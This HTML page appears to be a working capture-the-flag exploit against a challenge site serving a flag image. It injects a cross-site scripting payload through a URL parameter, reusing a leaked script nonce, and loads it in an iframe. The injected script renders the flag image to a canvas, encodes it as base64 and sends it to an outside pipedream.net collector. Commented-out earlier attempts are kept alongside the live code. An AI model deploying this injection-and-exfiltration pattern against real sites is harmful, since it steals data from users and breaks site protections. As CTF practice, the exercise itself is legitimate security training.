<html>
  <body>
    <h1>Hello</h1>
      <!-- //fetch('http://localhost:8000/visit',{method:'POST',body:JSON.stringify({url:'https://enaq7r3pd5yua.x.pipedream.net/'+b64.length})}); -->
    <!-- <iframe src="http://35.224.135.84:3200/?name=%3Cscript+nonce%3d70861e83ad7f1863b3020799df93e450%3Ealert(%27xss%27)%3C/script%3E"></iframe> -->
    <!-- 
    <script nonce=70861e83ad7f1863b3020799df93e450>var i = new Image();i.onload = function(){var i=document.querySelector('#flag');var c=document.createElement('canvas');c.width=i.width;c.height=i.height;var ctx=c.getContext('2d');ctx.drawImage(i,0,0);var b64=c.toDataURL('image/png');window.parent.postMessage({flag:b64},'*')};i.src='http://imgfiltrate.hub/flag.php';</script>
    <script>

    </script>
    -->


    <!--
      This works to hit the exfil server, but the image that's retrieved does not include the flag.
      This is likely because of the SameSite=strict property of the cookie, and since the origin of this
      page is not on imgfiltrate.hub, it doesn't include the cookie to get the real flag.
    -->
    <script>
      window.onmessage = function(e) {
        if (e.data && e.data.flag) {
          fetch('https://enaq7r3pd5yua.x.pipedream.net/', {method: 'POST', body: e.data.flag});
        }
      }
      // urls.forEach(window.open);
      var ex = function(b64) {
        var i = 0; var urls = [];
        while(i < b64.length) {
          urls.push('https://enaq7r3pd5yua.x.pipedream.net/'+b64.slice(i, i+1750));
          i+=1750;
        }
        console.log(urls);
      };
      var i = new Image();i.onload = function(){var c=document.createElement('canvas');c.width=i.width;c.height=i.height;var ctx=c.getContext('2d');ctx.drawImage(i,0,0);var b64=c.toDataURL('image/png');ex(b64);};i.src='http://35.224.135.84:3200/flag.php';
    </script>
    <!-- <iframe sandbox="allow-scripts allow-same-origin" src="http://imgfiltrate.hub/?name=%3cscript%20nonce%3d70861e83ad7f1863b3020799df93e450%3evar%20i%20%3d%20new%20Image()%3bi.onload%20%3d%20function()%7bvar%20c%3ddocument.createElement('canvas')%3bc.width%3di.width%3bc.height%3di.height%3bvar%20ctx%3dc.getContext('2d')%3bctx.drawImage(i%2c0%2c0)%3bvar%20b64%3dc.toDataURL('image%2fpng')%3bconsole.log(b64)%3bwindow.parent.postMessage(%7bflag%3ab64%7d%2c'*')%3b%7d%3bi.src%3d'http%3a%2f%2fimgfiltrate.hub%2fflag.php?v=1'%3b%3c%2fscript%3e"></iframe> -->
    <iframe sandbox="allow-scripts" src="http://35.224.135.84:3200/?name=%3cscript%20nonce%3d70861e83ad7f1863b3020799df93e450%3evar%20i%20%3d%20new%20Image()%3bi.crossOrigin%3d'anonymous'%3bi.onload%20%3d%20function()%7bvar%20c%3ddocument.createElement('canvas')%3bc.width%3di.width%3bc.height%3di.height%3bvar%20ctx%3dc.getContext('2d')%3bctx.drawImage(i%2c0%2c0)%3bvar%20b64%3dc.toDataURL('image%2fpng')%3bconsole.log(b64)%3bwindow.parent.postMessage(%7bflag%3ab64%7d%2c'*')%3b%7d%3bi.src%3d'http%3a%2f%2f35.224.135.84%3a3200%2fflag.php%3fv%3d1'%3b%3c%2fscript%3e"></iframe>
  </body>
</html>
